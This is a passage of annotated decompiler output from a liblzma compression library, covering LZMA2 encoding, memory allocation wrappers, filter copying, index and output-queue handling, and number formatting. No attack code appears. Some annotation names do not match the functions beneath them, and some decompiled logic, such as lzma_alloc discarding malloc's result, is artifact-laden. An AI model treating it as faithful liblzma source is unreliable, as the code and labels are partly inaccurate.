    param_1[uVar14 + 0x21] = (long)param_1 + (uVar12 + 0x35c2 + (ulong)uVar19 * 0x10) * 2;
    cVar2 = *(char *)((long)param_1 + 0xb74);
    *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x34) = 0;
    param_1[uVar14 + 0x22] = (long)param_1 + (ulong)uVar19 * 2 + 0x6d04;
    puVar1 = param_1 + 0xe3d;
    *(uint *)(param_1 + 0x59) = (-(uint)(uVar19 < 7) & 0xfffffffd) + 10;
    uVar18 = uVar14 + 3;
    uVar11 = uVar14 + 6;
    *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x38) = 0;
    param_1[uVar14 + 0x23] = (ulong)puVar1;
    uVar14 = 1;
    do {
      *(undefined4 *)((long)param_1 + uVar18 * 4 + 0x30) = 0;
      param_1[uVar18 + 0x21] = uVar12 * 0x10 + 4 + uVar14 * 2 + (long)puVar1;
      uVar18 = uVar18 + 1;
      uVar14 = (ulong)(uint)((int)uVar14 * 2);
    } while (uVar11 != uVar18);
    param_1[4] = uVar11;
    if (cVar2 == '\0') {
      piVar22 = (int *)((long)param_1 + uVar12 * 4 + 0xb9f0);
      *piVar22 = *piVar22 - 1;
      if (*piVar22 == 0) {
        lzma_literal_price_init(puVar1);
        uVar11 = param_1[4];
      }
    }
    uVar18 = 1;
    uVar19 = DAT_00128d9f + 0x30;
    uVar14 = uVar11;
    do {
      uVar23 = uVar19 >> (((char)uVar11 + '\x05') - (char)uVar14 & 0x1fU) & 1;
      lVar10 = uVar18 * 2;
      *(uint *)((long)param_1 + uVar14 * 4 + 0x30) = uVar23;
      uVar18 = (ulong)(uVar23 + (int)uVar18 * 2);
      param_1[uVar14 + 0x21] = (long)param_1 + lVar10 + 0x6ee4;
      uVar14 = uVar14 + 1;
    } while (uVar14 != uVar11 + 6);
    uVar23 = uVar19 >> 1;
    iVar17 = uVar23 - 5;
    uVar19 = ~((uVar19 & 1 | 2) << ((char)uVar23 - 1U & 0x1f));
    piVar22 = (int *)((long)param_1 + uVar11 * 4 + 0x48);
    do {
      iVar17 = iVar17 - 1;
      *piVar22 = ((uVar19 >> 4) >> ((byte)iVar17 & 0x1f) & 1) + 2;
      piVar22 = piVar22 + 1;
    } while (iVar17 != 0);
    uVar7 = 1;
    lVar10 = (ulong)(uVar23 - 6) + uVar11 + 6;
    uVar18 = lVar10 + 1;
    uVar14 = lVar10 + 5;
    uVar19 = uVar19 & 0xf;
    do {
      uVar11 = (ulong)uVar7;
      *(uint *)((long)param_1 + uVar18 * 4 + 0x30) = uVar19 & 1;
      uVar7 = (uVar19 & 1) + uVar7 * 2;
      param_1[uVar18 + 0x21] = (long)param_1 + uVar11 * 2 + 0x71c8;
      uVar18 = uVar18 + 1;
      uVar19 = uVar19 >> 1;
    } while (uVar14 != uVar18);
    *(int *)(param_1 + 0x21d8) = (int)param_1[0x21d8] + 1;
    *(int *)((long)param_1 + 0x10e7c) = *(int *)((long)param_1 + 0x10e7c) + 1;
    *(undefined4 *)(param_1 + 0x5b) = *(undefined4 *)((long)param_1 + 0x2d4);
    *(int *)((long)param_1 + 0x2d4) = (int)param_1[0x5a];
    uVar5 = *(undefined4 *)((long)param_1 + 0x2cc);
    *(undefined4 *)((long)param_1 + 0x2cc) = 0xffffffff;
    *(undefined4 *)(param_1 + 0x5a) = uVar5;
  }
  *(undefined8 *)((long)param_1 + uVar14 * 4 + 0x30) = 0x400000004;
  *(undefined8 *)((long)param_1 + uVar14 * 4 + 0x38) = 0x400000004;
  *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x40) = 4;
  uVar18 = param_1[5];
  param_1[4] = uVar14 + 5;
  while (uVar18 < uVar14 + 5) {
    uVar11 = param_1[2];
    if ((uint)uVar11 < 0x1000000) {
      uVar12 = *param_1;
      if (((uint)uVar12 < 0xff000000) || (uVar12 >> 0x20 != 0)) {
        lVar10 = *param_4;
        do {
          if (param_5 == lVar10) {
            *(undefined1 *)((long)param_1 + 0xb76) = 1;
            goto LAB_00118d78;
          }
          cVar2 = *(char *)((long)param_1 + 0x14);
          param_1[3] = param_1[3] + 1;
          *(undefined1 *)((long)param_1 + 0x14) = 0xff;
          *(char *)(param_3 + lVar10) = cVar2 + (char)(uVar12 >> 0x20);
          lVar10 = lVar10 + 1;
          puVar1 = param_1 + 1;
          *puVar1 = *puVar1 - 1;
          uVar15 = *puVar1;
          *param_4 = lVar10;
        } while (uVar15 != 0);
        *(char *)((long)param_1 + 0x14) = (char)(uVar12 >> 0x18);
        uVar15 = 1;
      }
      else {
        uVar15 = param_1[1] + 1;
      }
      param_1[1] = uVar15;
      *(uint *)(param_1 + 2) = (uint)uVar11 << 8;
      *param_1 = (uVar12 & 0xffffff) << 8;
    }
    if (*(uint *)((long)param_1 + uVar18 * 4 + 0x30) < 5) {
                    /* WARNING: Could not recover jumptable at 0x0011932f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      uVar9 = (*(code *)(&DAT_00128c70 +
                        *(int *)(&DAT_00128c70 +
                                (ulong)*(uint *)((long)param_1 + uVar18 * 4 + 0x30) * 4)))();
      return uVar9;
    }
    uVar18 = uVar18 + 1;
    param_1[5] = uVar18;
  }
  param_1[4] = 0;
  uVar9 = 1;
  param_1[5] = 0;
  goto LAB_00118d7a;
}



/**
 * @name  lzma2_encoder_encode
 * @brief LZMA2 encode step: returns LZMA_STREAM_END(8) if state==1, otherwise calls sub-encoder
 * @confidence 80%
 * @classification io
 * @address 0x0011a320
 */

/* LZMA2 encode step; returns 8 if state field==1, otherwise calls lzma_encode */

undefined8 lzma2_encoder_encode(undefined8 param_1,long param_2)

{
  undefined8 uVar1;
  
  if (*(int *)(param_2 + 0x68) != 1) {
    uVar1 = lzma_encode();
    return uVar1;
  }
  return 8;
}



/**
 * @name  lzma_lzma2_encoder_encode
 * @brief LZMA2 block buffer encoding state machine. States: 0=check completion, 1=compress data, 2=write block header, 3=write uncompressed header, 4=copy uncompressed data. Handles compressed and uncompressed paths.
 * @confidence 82%
 * @classification io
 * @address 0x00120860
 */

/* State machine for progressive block buffer encoding. States: 0=start/check completion, 1=compress
   data, 2=write block header, 3=write uncompressed header, 4=copy uncompressed data. Handles both
   compressed and uncompressed encoding paths with block header generation. */

ulong lzma_block_buffer_encode_state_machine
                (undefined4 *param_1,long *param_2,long param_3,ulong *param_4,ulong param_5)

{
  long *plVar1;
  char cVar2;
  uint uVar3;
  long lVar4;
  long lVar5;
  char cVar6;
  ulong uVar7;
  ulong uVar8;
  undefined8 uVar9;
  long lVar10;
  int iVar11;
  long lVar12;
  int iVar13;
  long lVar14;
  long lVar15;
  int iVar16;
  ulong __n;
  long local_40;
  
  uVar7 = *param_4;
switchD_001208a7_default:
  if (param_5 <= uVar7) {
    return 0;
  }
  do {
    switch(*param_1) {
    case 0:
      goto switchD_001208a7_caseD_0;
    case 1:
      iVar16 = (int)param_2[3];
      iVar13 = *(int *)((long)param_2 + 0x1c);
      uVar9 = *(undefined8 *)(param_1 + 2);
      uVar3 = 0x200000 - param_1[0x22];
      goto LAB_001209a1;
    case 2:
      lVar4 = *(long *)(param_1 + 0x24);
      goto LAB_00120aae;
    case 3:
      lzma_bufcpy(param_1 + 0x28,param_1 + 0x26,3,param_3,param_4,param_5);
      if (*(long *)(param_1 + 0x26) != 3) {
        return 0;
      }
      *param_1 = 4;
      uVar7 = *param_4;
    case 4:
      uVar8 = *(ulong *)(param_1 + 0x22);
      __n = param_5 - uVar7;
      if (uVar8 < param_5 - uVar7) {
        __n = uVar8;
      }
      memcpy((void *)(param_3 + uVar7),(void *)((*(uint *)(param_2 + 3) - uVar8) + *param_2),__n);
      uVar7 = uVar7 + __n;
      plVar1 = (long *)(param_1 + 0x22);
      *plVar1 = *plVar1 - __n;
      lVar4 = *plVar1;
      *param_4 = uVar7;
      if (lVar4 != 0) {
        return 0;
      }
      *param_1 = 0;
      if (param_5 <= uVar7) {
        return 0;
      }
      break;
    default:
      goto switchD_001208a7_default;
    }
  } while( true );
switchD_001208a7_caseD_0:
  iVar13 = *(int *)((long)param_2 + 0x1c);
  iVar16 = (int)param_2[3];
  if (iVar16 == *(int *)((long)param_2 + 0x24) + iVar13) {
    lVar4 = param_2[0xd];
    if ((int)lVar4 == 3) {
      *param_4 = uVar7 + 1;
      *(undefined1 *)(param_3 + uVar7) = 0;
    }
    return (ulong)((int)lVar4 != 0);
  }
  uVar9 = *(undefined8 *)(param_1 + 2);
  if (*(char *)((long)param_1 + 0x81) != '\0') {
    uVar7 = lzma_encoder_init(uVar9,param_1 + 4);
    if ((int)uVar7 != 0) {
      return uVar7;
    }
    iVar16 = (int)param_2[3];
    iVar13 = *(int *)((long)param_2 + 0x1c);
    uVar9 = *(undefined8 *)(param_1 + 2);
  }
  *(undefined8 *)(param_1 + 0x22) = 0;
  uVar3 = 0x200000;
  *(undefined8 *)(param_1 + 0x24) = 0;
  *param_1 = 1;
LAB_001209a1:
  iVar11 = 0;
  if (*(uint *)((long)param_2 + 100) <= uVar3) {
    iVar11 = ((uVar3 + iVar16) - *(uint *)((long)param_2 + 100)) - iVar13;
  }
  iVar11 = lzma_encode(uVar9,param_2,(long)param_1 + 0xa6,param_1 + 0x24,0x10000,iVar11);
  uVar3 = *(uint *)((long)param_2 + 0x1c);
  uVar7 = (ulong)((((int)param_2[3] - uVar3) + iVar13) - iVar16) + *(long *)(param_1 + 0x22);
  *(ulong *)(param_1 + 0x22) = uVar7;
  if (iVar11 != 1) {
    return 0;
  }
  uVar8 = *(ulong *)(param_1 + 0x24);
  if (uVar8 < uVar7) {
    cVar2 = *(char *)(param_1 + 0x20);
    if (cVar2 == '\0') {
      if (*(char *)((long)param_1 + 0x81) == '\0') {
        lVar10 = 5;
        cVar6 = -0x80;
        lVar4 = 1;
        *(undefined1 *)((long)param_1 + 0xa1) = 0x80;
        local_40 = 6;
        lVar12 = 4;
        lVar14 = 3;
        lVar15 = 2;
      }
      else {
        lVar10 = 5;
        cVar6 = -0x60;
        lVar4 = 1;
        *(undefined1 *)((long)param_1 + 0xa1) = 0xa0;
        local_40 = 6;
        lVar12 = 4;
        lVar14 = 3;
        lVar15 = 2;
      }
    }
    else if (*(char *)((long)param_1 + 0x82) == '\0') {
      *(undefined1 *)(param_1 + 0x28) = 0xc0;
      lVar10 = 4;
      cVar6 = -0x40;
      lVar4 = 0;
      local_40 = 5;
      lVar12 = 3;
      lVar14 = 2;
      lVar15 = 1;
    }
    else {
      *(undefined1 *)(param_1 + 0x28) = 0xe0;
      lVar10 = 4;
      cVar6 = -0x20;
      lVar4 = 0;
      local_40 = 5;
      lVar12 = 3;
      lVar14 = 2;
      lVar15 = 1;
    }
    lVar5 = uVar7 - 1;
    *(long *)(param_1 + 0x26) = lVar4;
    *(char *)((long)param_1 + lVar4 + 0xa0) = cVar6 + (char)((ulong)lVar5 >> 0x10);
    *(char *)((long)param_1 + lVar15 + 0xa0) = (char)((ulong)lVar5 >> 8);
    *(char *)((long)param_1 + lVar14 + 0xa0) = (char)lVar5;
    *(char *)((long)param_1 + lVar12 + 0xa0) = (char)(uVar8 - 1 >> 8);
    *(char *)((long)param_1 + lVar10 + 0xa0) = (char)(uVar8 - 1);
    if (cVar2 != '\0') {
      lzma_lzma_lclppb_encode(param_1 + 4,(long)param_1 + local_40 + 0xa0);
      uVar8 = *(ulong *)(param_1 + 0x24);
    }
    lVar4 = uVar8 + 6;
    *(undefined1 *)((long)param_1 + 0x82) = 0;
    *(undefined2 *)(param_1 + 0x20) = 0;
    *(long *)(param_1 + 0x24) = lVar4;
    *param_1 = 2;
LAB_00120aae:
    lzma_bufcpy(param_1 + 0x28,param_1 + 0x26,lVar4,param_3,param_4);
    if (*(long *)(param_1 + 0x26) != *(long *)(param_1 + 0x24)) {
      return 0;
    }
    *param_1 = 0;
    uVar7 = *param_4;
  }
  else {
    lVar4 = uVar7 + uVar3;
    cVar2 = *(char *)((long)param_1 + 0x82);
    *(undefined4 *)((long)param_2 + 0x1c) = 0;
    *(long *)(param_1 + 0x22) = lVar4;
    uVar7 = *param_4;
    *param_1 = 3;
    *(char *)(param_1 + 0x28) = (cVar2 == '\0') + '\x01';
    *(char *)((long)param_1 + 0xa2) = (char)lVar4 - 1;
    *(char *)((long)param_1 + 0xa1) = (char)((ulong)(lVar4 - 1) >> 8);
    *(undefined8 *)(param_1 + 0x26) = 0;
    *(undefined2 *)((long)param_1 + 0x81) = 1;
  }
  goto switchD_001208a7_default;
}



/* ==================== Memory Management ==================== */

/**
 * @name  lzma_alloc
 * @brief Allocates memory via custom allocator or standard malloc, minimum 1 byte
 * @confidence 95%
 * @classification memory
 * @address 0x001050d0
 */

/* Allocates memory via custom allocator or malloc */

void lzma_alloc(size_t param_1,undefined8 *param_2)

{
  size_t __size;
  
  __size = 1;
  if (param_1 != 0) {
    __size = param_1;
  }
  if ((param_2 != (undefined8 *)0x0) && ((code *)*param_2 != (code *)0x0)) {
                    /* WARNING: Could not recover jumptable at 0x001050f6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*(code *)*param_2)(param_2[2],1);
    return;
  }
  malloc(__size);
  return;
}



/**
 * @name  lzma_free
 * @brief Frees memory using custom allocator's free function or standard free()
 * @confidence 95%
 * @classification memory
 * @address 0x00105170
 */

/* Frees memory using custom allocator or standard free() */

void lzma_free(void *param_1,long param_2)

{
  if ((param_2 != 0) && (*(code **)(param_2 + 8) != (code *)0x0)) {
                    /* WARNING: Could not recover jumptable at 0x0010518c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (**(code **)(param_2 + 8))(*(undefined8 *)(param_2 + 0x10),param_1);
    return;
  }
  free(param_1);
  return;
}



/**
 * @name  lzma_bufcpy
 * @brief Copies data between buffers with dual position tracking, returns bytes copied
 * @confidence 95%
 * @classification memory
 * @address 0x001051e0
 */

/* Buffer copy with dual position tracking */

size_t lzma_bufcpy(long param_1,long *param_2,long param_3,long param_4,long *param_5,long param_6)

{
  long lVar1;
  long lVar2;
  ulong __n;
  
  lVar1 = *param_2;
  lVar2 = *param_5;
  __n = param_6 - lVar2;
  if ((ulong)(param_3 - lVar1) <= (ulong)(param_6 - lVar2)) {
    __n = param_3 - lVar1;
  }
  if (__n != 0) {
    memcpy((void *)(param_4 + lVar2),(void *)(param_1 + lVar1),__n);
  }
  *param_2 = lVar1 + __n;
  *param_5 = lVar2 + __n;
  return __n;
}



/**
 * @name  lzma_filters_copy
 * @brief Deep copies LZMA filter chain. Iterates up to 4 filters, looks up options size, allocates and copies options. Frees allocated options on failure. Uses optimized memcpy for final copy.
 * @confidence 95%
 * @classification memory
 * @address 0x00105b20
 */

/* Deep copies an LZMA filter chain. Iterates through source filters (up to 4), looks up each
   filter's options size from a table, allocates memory for options, and copies them. On failure,
   frees all previously allocated option structures. Copies the final array to dest using an
   optimized memcpy-like approach. */

undefined8 lzma_filters_copy(size_t *param_1,size_t *param_2,undefined8 param_3)

{
  size_t sVar1;
  void *__dest;
  ulong uVar2;
  size_t *psVar3;
  size_t *psVar4;
  long lVar5;
  undefined8 *puVar6;
  undefined8 *puVar7;
  size_t sVar8;
  undefined8 uVar9;
  uint uVar10;
  long lVar11;
  long in_FS_OFFSET;
  byte bVar12;
  size_t local_a0 [12];
  long local_40;
  
  bVar12 = 0;
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((param_1 == (size_t *)0x0) || (param_2 == (size_t *)0x0)) {
    uVar9 = 0xb;
  }
  else {
    sVar8 = *param_1;
    if (sVar8 != 0xffffffffffffffff) {
      psVar4 = local_a0 + 1;
      param_1 = param_1 + 1;
      lVar11 = 0;
      local_a0[1] = sVar8;
      if (*param_1 != 0) goto LAB_00105bb9;
LAB_00105b80:
      psVar4[1] = 0;
      lVar5 = lVar11;
      do {
        sVar8 = param_1[1];
        lVar11 = lVar5 + 1;
        if (sVar8 == 0xffffffffffffffff) {
          uVar10 = ((int)lVar5 + 2) * 0x10;
          goto LAB_00105cd2;
        }
        psVar4 = psVar4 + 2;
        param_1 = param_1 + 2;
        if (lVar11 == 4) {
          uVar9 = 8;
          lVar11 = 3;
LAB_00105c05:
          psVar4 = local_a0 + lVar11 * 2 + 2;
          do {
            sVar8 = *psVar4;
            psVar4 = psVar4 - 2;
            lzma_free(sVar8,param_3);
          } while (psVar4 != local_a0);
          goto LAB_00105c2d;
        }
        sVar1 = *param_1;
        *psVar4 = sVar8;
        if (sVar1 == 0) goto LAB_00105b80;
LAB_00105bb9:
        if (sVar8 == 0x4000000000000001) {
          local_a0[0] = 0x70;
        }
        else {
          lVar5 = 0;
          sVar1 = 0x4000000000000002;
          psVar3 = &filter_id_options_table;
          while (lVar5 = lVar5 + 1, sVar1 != sVar8) {
            if (sVar1 == 0xffffffffffffffff) {
              uVar9 = 8;
              goto LAB_00105bfc;
            }
            sVar1 = *psVar3;
            psVar3 = psVar3 + 3;
          }
          local_a0[0] = *(size_t *)(&UNK_001230a8 + lVar5 * 0x18);
        }
        __dest = (void *)lzma_alloc(local_a0[0],param_3);
        psVar4[1] = (size_t)__dest;
        if (__dest == (void *)0x0) {
          uVar9 = 5;
LAB_00105bfc:
          if (lVar11 != 0) {
            lVar11 = lVar11 - 1;
            goto LAB_00105c05;
          }
          goto LAB_00105c2d;
        }
        memcpy(__dest,(void *)*param_1,local_a0[0]);
        lVar5 = lVar11;
      } while( true );
    }
    uVar10 = 0x10;
    lVar11 = 0;
LAB_00105cd2:
    local_a0[lVar11 * 2 + 1] = 0xffffffffffffffff;
    local_a0[lVar11 * 2 + 2] = 0;
    lVar11 = (long)param_2 - (long)((ulong)(param_2 + 1) & 0xfffffffffffffff8);
    *param_2 = local_a0[1];
    *(undefined8 *)((long)param_2 + ((ulong)uVar10 - 8)) =
         *(undefined8 *)((long)local_a0 + (ulong)uVar10);
    uVar9 = 0;
    puVar6 = (undefined8 *)((long)local_a0 + (8 - lVar11));
    puVar7 = (undefined8 *)((ulong)(param_2 + 1) & 0xfffffffffffffff8);
    for (uVar2 = (ulong)((int)lVar11 + uVar10 >> 3); uVar2 != 0; uVar2 = uVar2 - 1) {
      *puVar7 = *puVar6;
      puVar6 = puVar6 + (ulong)bVar12 * -2 + 1;
      puVar7 = puVar7 + (ulong)bVar12 * -2 + 1;
    }
  }
LAB_00105c2d:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar9;
}



/**
 * @name  lzma_index_node_alloc
 * @brief Allocates and zero-initializes a 0x50-byte index stream node with default capacity 0x200
 * @confidence 80%
 * @classification memory
 * @address 0x00106110
 */

/* Allocates and zero-initializes a 0x50-byte index node structure */

void lzma_index_node_alloc(undefined8 param_1)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)lzma_alloc(0x50,param_1);
  if (puVar1 != (undefined8 *)0x0) {
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    *(undefined4 *)(puVar1 + 3) = 0;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    puVar1[7] = 0;
    puVar1[8] = 0x200;
    *(undefined4 *)(puVar1 + 9) = 0;
  }
  return;
}



/**
 * @name  lzma_index_dup
 * @brief Deep-copies an LZMA index structure. Duplicates the tree of streams and groups, copying all record data and statistics. Returns new index or 0 on failure.
 * @confidence 90%
 * @classification memory
 * @address 0x00106ea0
 */

long lzma_index_dup(long param_1,undefined8 param_2)

{
  ulong uVar1;
  undefined8 uVar2;
  long lVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  long lVar6;
  undefined8 *puVar7;
  long lVar8;
  undefined8 *puVar9;
  long lVar10;
  long local_50;
  
  local_50 = lzma_index_node_alloc(param_2);
  if (local_50 != 0) {
    puVar9 = *(undefined8 **)(param_1 + 8);
    *(undefined8 *)(local_50 + 0x20) = *(undefined8 *)(param_1 + 0x20);
    *(undefined8 *)(local_50 + 0x28) = *(undefined8 *)(param_1 + 0x28);
    *(undefined8 *)(local_50 + 0x30) = *(undefined8 *)(param_1 + 0x30);
    *(undefined8 *)(local_50 + 0x38) = *(undefined8 *)(param_1 + 0x38);
    uVar1 = puVar9[0xb];
    while (uVar1 < 0xffffffffffffffc) {
      while( true ) {
        lVar6 = initialize_structure
                          (puVar9[1],*puVar9,*(undefined4 *)(puVar9 + 5),puVar9[6],param_2);
        if (lVar6 == 0) goto LAB_00107083;
        lVar10 = puVar9[0xb];
        uVar4 = puVar9[0xd];
        uVar5 = puVar9[0xe];
        lVar8 = puVar9[8];
        *(long *)(lVar6 + 0x58) = lVar10;
        uVar2 = puVar9[0xc];
        *(undefined8 *)(lVar6 + 0x68) = uVar4;
        *(undefined8 *)(lVar6 + 0x70) = uVar5;
        uVar4 = puVar9[0xf];
        uVar5 = puVar9[0x10];
        *(undefined8 *)(lVar6 + 0x60) = uVar2;
        *(undefined8 *)(lVar6 + 0x78) = uVar4;
        *(undefined8 *)(lVar6 + 0x80) = uVar5;
        uVar2 = puVar9[0x12];
        *(undefined8 *)(lVar6 + 0x88) = puVar9[0x11];
        *(undefined8 *)(lVar6 + 0x90) = uVar2;
        *(undefined8 *)(lVar6 + 0x98) = puVar9[0x13];
        *(undefined8 *)(lVar6 + 0xa0) = puVar9[0x14];
        if (lVar8 != 0) {
          puVar7 = (undefined8 *)lzma_alloc((lVar10 + 4) * 0x10,param_2);
          if (puVar7 == (undefined8 *)0x0) {
            lzma_index_stream_end(lVar6,param_2);
            goto LAB_00107083;
          }
          *puVar7 = 0;
          lVar8 = puVar9[8];
          lVar10 = 0;
          puVar7[1] = 0;
          puVar7[5] = 1;
          lVar3 = puVar9[0xb];
          puVar7[6] = lVar3;
          puVar7[7] = lVar3 - 1;
          do {
            while( true ) {
              memcpy(puVar7 + lVar10 * 2 + 8,(void *)(lVar8 + 0x40),
                     (*(long *)(lVar8 + 0x38) + 1) * 0x10);
              lVar10 = lVar10 + 1 + *(long *)(lVar8 + 0x38);
              lVar3 = *(long *)(lVar8 + 0x20);
              if (*(long *)(lVar8 + 0x20) == 0) break;
              do {
                lVar8 = lVar3;
                lVar3 = *(long *)(lVar8 + 0x18);
              } while (*(long *)(lVar8 + 0x18) != 0);
            }
            lVar8 = lzma_index_tree_get_last_leaf(lVar8);
          } while (lVar8 != 0);
          skiplist_insert_node(lVar6 + 0x38,puVar7);
        }
        skiplist_insert_node(local_50,lVar6);
        puVar7 = (undefined8 *)puVar9[4];
        if ((undefined8 *)puVar9[4] == (undefined8 *)0x0) break;
        do {
          puVar9 = puVar7;
          puVar7 = (undefined8 *)puVar9[3];
        } while ((undefined8 *)puVar9[3] != (undefined8 *)0x0);
        if (0xffffffffffffffb < (ulong)puVar9[0xb]) goto LAB_00107083;
      }
      puVar9 = (undefined8 *)lzma_index_tree_get_last_leaf(puVar9);
      if (puVar9 == (undefined8 *)0x0) {
        return local_50;
      }
      uVar1 = puVar9[0xb];
    }
LAB_00107083:
    lzma_index_end(local_50,param_2);
    local_50 = 0;
  }
  return local_50;
}



/**
 * @name  lzma_outq_pop
 * @brief Pops front element from output queue, decrements count, adjusts memory, frees node
 * @confidence 85%
 * @classification memory
 * @address 0x00109990
 */

/* Pops front element from output queue, updates counters, frees */

void lzma_outq_pop(long param_1)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  
  puVar1 = *(undefined8 **)(param_1 + 0x18);
  uVar2 = *puVar1;
  *(int *)(param_1 + 0x34) = *(int *)(param_1 + 0x34) - 1;
  *(undefined8 *)(param_1 + 0x18) = uVar2;
  *(long *)(param_1 + 0x20) = (*(long *)(param_1 + 0x20) - 0x40) - puVar1[2];
  lzma_free(puVar1);
  return;
}



/**
 * @name  lzma_outq_remove_head
 * @brief Removes the head node from the output queue linked list, adjusts counters and memory accounting.
 * @confidence 72%
 * @classification memory
 * @address 0x001099c0
 */

/* Removes node from linked list structure with deallocation and state validation */

void lzma_dec_remove_node(long *param_1,undefined8 param_2)

{
  long *plVar1;
  long lVar2;
  long lVar3;
  
  plVar1 = (long *)*param_1;
  lVar2 = *plVar1;
  *param_1 = lVar2;
  if (lVar2 == 0) {
    param_1[1] = 0;
  }
  lVar2 = param_1[3];
  lVar3 = plVar1[2];
  if ((lVar2 != 0) && (*(long *)(lVar2 + 0x10) != lVar3)) {
    do {
      lzma_outq_pop(param_1,param_2);
    } while (param_1[3] != 0);
    lVar3 = plVar1[2];
    lVar2 = 0;
  }
  *plVar1 = lVar2;
  param_1[3] = (long)plVar1;
  *(int *)(param_1 + 6) = (int)param_1[6] - 1;
  param_1[5] = (param_1[5] - 0x40) - lVar3;
  return;
}



/**
 * @name  lzma_outq_alloc_buffer
 * @brief Allocates output queue buffer of specified size. Reuses existing if same size, otherwise frees old buffers first.
 * @confidence 78%
 * @classification memory
 * @address 0x00109c00
 */

/* Allocates a memory block of specified size through an allocator, manages allocation tracking and
   validation. */

undefined8 lzma_outq_alloc_buffer(long param_1,undefined8 param_2,ulong param_3)

{
  undefined8 *puVar1;
  
  if (*(long *)(param_1 + 0x18) == 0) {
    if (0xffffffffffffffbf < param_3) {
      return 5;
    }
  }
  else {
    if (*(ulong *)(*(long *)(param_1 + 0x18) + 0x10) == param_3) {
      return 0;
    }
    if (0xffffffffffffffbf < param_3) {
      return 5;
    }
    do {
      lzma_outq_pop(param_1,param_2);
    } while (*(long *)(param_1 + 0x18) != 0);
  }
  puVar1 = (undefined8 *)lzma_alloc(param_3 + 0x40,param_2);
  *(undefined8 **)(param_1 + 0x18) = puVar1;
  if (puVar1 != (undefined8 *)0x0) {
    *puVar1 = 0;
    puVar1[2] = param_3;
    *(int *)(param_1 + 0x34) = *(int *)(param_1 + 0x34) + 1;
    *(long *)(param_1 + 0x20) = *(long *)(param_1 + 0x20) + param_3 + 0x40;
    return 0;
  }
  return 5;
}



/**
 * @name  lzma_outq_enqueue
 * @brief Enqueues a new element into output queue linked list, initializes fields, updates counters and memory tracking.
 * @confidence 82%
 * @classification memory
 * @address 0x00109cb0
 */

/* Enqueues a new element into the output queue linked list */

void lzma_outq_enqueue(undefined8 *param_1,undefined8 param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  long lVar3;
  long lVar4;
  
  puVar1 = (undefined8 *)param_1[3];
  param_1[3] = *puVar1;
  puVar2 = (undefined8 *)param_1[1];
  *puVar1 = 0;
  if (puVar2 == (undefined8 *)0x0) {
    *param_1 = puVar1;
  }
  else {
    *puVar2 = puVar1;
  }
  lVar3 = param_1[5];
  lVar4 = puVar1[2];
  param_1[1] = puVar1;
  puVar1[1] = param_2;
  *(undefined1 *)(puVar1 + 5) = 0;
  *(undefined4 *)((long)puVar1 + 0x2c) = 1;
  puVar1[3] = 0;
  puVar1[4] = 0;
  puVar1[6] = 0;
  puVar1[7] = 0;
  *(int *)(param_1 + 6) = *(int *)(param_1 + 6) + 1;
  param_1[5] = lVar3 + 0x40 + lVar4;
  return;
}



/**
 * @name  lzma_delta_props_alloc_copy
 * @brief Conditionally allocates and copies delta filter properties. Returns 0 on success, 5 for memory error, 8 for invalid size.
 * @confidence 80%
 * @classification memory
 * @address 0x00121d40
 */

/* Conditionally allocates and copies delta filter properties */

undefined4
lzma_delta_props_alloc_copy(undefined8 *param_1,undefined8 param_2,int *param_3,long param_4)

{
  int iVar1;
  undefined4 uVar2;
  int *piVar3;
  
  uVar2 = 0;
  if ((param_4 != 0) && (uVar2 = 8, param_4 == 4)) {
    piVar3 = (int *)lzma_alloc(4);
    if (piVar3 == (int *)0x0) {
      uVar2 = 5;
    }
    else {
      iVar1 = *param_3;
      *piVar3 = iVar1;
      if (iVar1 == 0) {
        lzma_free(piVar3,param_2);
        uVar2 = 0;
      }
      else {
        *param_1 = piVar3;
        uVar2 = 0;
      }
    }
    return uVar2;
  }
  return uVar2;
}



/* ==================== String Operations ==================== */

/**
 * @name  lzma_str_append
 * @brief Appends string to buffer at current position with 799-byte max constraint
 * @confidence 85%
 * @classification string
 * @address 0x001078d0
 */

/* Appends string to buffer with 799-byte max constraint */

void lzma_str_append(long param_1,long *param_2,char *param_3)

{
  size_t sVar1;
  ulong __n;
  
  sVar1 = strlen(param_3);
  __n = 799 - *param_2;
  if (sVar1 < __n) {
    __n = sVar1;
  }
  memcpy((void *)(*param_2 + param_1),param_3,__n);
  *param_2 = *param_2 + __n;
  return;
}



/**
 * @name  lzma_str_format_number
 * @brief Formats a number with optional binary size units (KiB, MiB, GiB) for human-readable output.
 * @confidence 75%
 * @classification string
 * @address 0x00107920
 */

/* Formats an unsigned integer with optional binary size units (KB, MB, GB). If param_3 is set and
   the number is evenly divisible by powers of 1024, it shifts the number and appends the
   appropriate unit suffix. Converts the number to a decimal string and outputs via
   append_string_to_buffer callback. */

void format_number_with_units(undefined8 *param_1,uint param_2,char param_3)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  bool bVar3;
  long lVar4;
  long lVar5;
  undefined *puVar6;
  long in_FS_OFFSET;
  undefined8 uStack_40;
  undefined1 local_38 [16];
  long local_20;
  
  puVar1 = param_1 + 1;
  uVar2 = *param_1;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_2 == 0) {
    uStack_40 = (undefined *)0x107a1f;
    lzma_str_append(uVar2,puVar1,&DAT_001234aa);
    goto LAB_001079f5;
  }
  puVar6 = &DAT_001235c0;
  if ((param_3 != '\0') && ((param_2 & 0x3ff) == 0)) {
    if ((param_2 & 0xffc00) == 0) {
      if ((param_2 & 0x3ff00000) == 0) {
        puVar6 = &DAT_001235cc;
        param_2 = param_2 >> 0x1e;
        lVar4 = 3;
        if (param_2 == 0) goto LAB_00107991;
      }
      else {
        lVar4 = 2;
        param_2 = param_2 >> 0x14;
      }
    }
    else {
      lVar4 = 1;
      param_2 = param_2 >> 10;
    }
